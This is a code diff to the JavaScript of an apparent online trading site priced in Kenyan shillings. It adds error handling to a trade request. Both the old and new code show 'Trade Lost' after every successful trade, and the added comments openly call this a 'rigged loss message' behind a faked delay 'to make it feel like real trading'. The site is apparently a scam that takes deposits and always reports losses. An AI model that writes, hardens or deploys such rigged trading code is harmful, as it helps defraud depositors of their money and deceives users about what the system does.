@@ -436,6 +436,7 @@
 
             let balEl = document.getElementById('balance-display');
             let currentBal = parseFloat(balEl.innerText.replace('KES ', ''));
+            
             if(currentBal < amt) return Swal.fire({title: 'Insufficient Funds', text: 'Please deposit first.', icon: 'error', background: '#1a1a1a', color: '#fff', confirmButtonColor: '#008800'});
             
             Swal.fire({
@@ -445,26 +446,47 @@
                 didOpen: () => { Swal.showLoading() }
             });
 
-            const res = await fetch('/execute-trade/', {
-                method: 'POST', headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrfToken},
-                body: JSON.stringify({ amount: amt, type: type })
-            });
-            const data = await res.json();
+            try {
+                const res = await fetch('/execute-trade/', {
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrfToken},
+                    body: JSON.stringify({ amount: amt, type: type })
+                });
+                
+                // Check if the server crashed
+                if (!res.ok) throw new Error("Server communication failed.");
 
-            setTimeout(() => {
-                if(data.success) {
-                    balEl.innerText = `KES ${data.new_balance.toFixed(2)}`;
-                    Swal.fire({
-                        title: 'Trade Lost',
-                        text: `Your ${type} order closed out of the money. Lost KES ${amt}`,
-                        icon: 'error',
-                        background: '#1a1a1a', color: '#fff',
-                        confirmButtonColor: '#cc0000'
-                    });
-                } else {
-                    Swal.fire({title: 'Error', text: data.message, icon: 'warning', background: '#1a1a1a', color: '#fff'});
-                }
-            }, 1200);
+                const data = await res.json();
+
+                // Fake a 1.2-second delay to make it feel like real trading
+                setTimeout(() => {
+                    if(data.success) {
+                        // Update the balance on the screen instantly
+                        balEl.innerText = `KES ${data.new_balance.toFixed(2)}`;
+                        
+                        // Show the rigged loss message
+                        Swal.fire({
+                            title: 'Trade Lost',
+                            text: `Your ${type} order closed out of the money. Lost KES ${amt}`,
+                            icon: 'error',
+                            background: '#1a1a1a', color: '#fff',
+                            confirmButtonColor: '#cc0000'
+                        });
+                    } else {
+                        Swal.fire({title: 'Error', text: data.message, icon: 'warning', background: '#1a1a1a', color: '#fff'});
+                    }
+                }, 1200);
+
+            } catch (error) {
+                // Stop the spinner if the network drops or server crashes
+                Swal.fire({
+                    title: 'Connection Error', 
+                    text: 'Failed to execute trade. Please try again.', 
+                    icon: 'error', 
+                    background: '#1a1a1a', color: '#fff'
+                });
+                console.error(error);
+            }
         }
     </script>
 </body>
